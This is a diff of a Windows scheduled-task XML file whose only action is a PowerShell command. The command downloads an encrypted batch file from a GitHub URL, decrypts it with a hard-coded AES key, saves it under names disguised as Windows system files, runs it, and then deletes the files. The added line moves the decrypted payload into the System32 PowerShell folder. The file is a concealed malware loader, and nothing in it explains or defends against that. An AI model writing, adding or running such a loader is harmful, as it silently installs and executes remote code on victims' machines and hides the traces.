@@ -49,7 +49,7 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>-Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/b.bat' -OutFile '%TEMP%\WindowsErrorChecking.bat'; $encryptedBytes = [System.IO.File]::ReadAllBytes('%TEMP%\WindowsErrorChecking.bat'); $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $decryptor = $aes.CreateDecryptor(); $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); [System.IO.File]::WriteAllBytes('%TEMP%\WindowsShell.bat', $decryptedBytes); Start-Process '%TEMP%\WindowsShell.bat' -Wait; Remove-Item '%TEMP%\WindowsErrorChecking.bat', '%TEMP%\WindowsShell.bat' -Force"</Arguments>
+      <Arguments>-Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/b.bat' -OutFile '%TEMP%\WindowsErrorChecking.bat'; $encryptedBytes = [System.IO.File]::ReadAllBytes('%TEMP%\WindowsErrorChecking.bat'); $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $decryptor = $aes.CreateDecryptor(); $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); $decryptedFile = 'C:\Windows\System32\WindowsPowerShell\WindowsShell.bat'; [System.IO.File]::WriteAllBytes($decryptedFile, $decryptedBytes); Start-Process $decryptedFile -Wait; Remove-Item '%TEMP%\WindowsErrorChecking.bat', $decryptedFile -Force;"</Arguments>
     </Exec>
   </Actions>
 </Task>
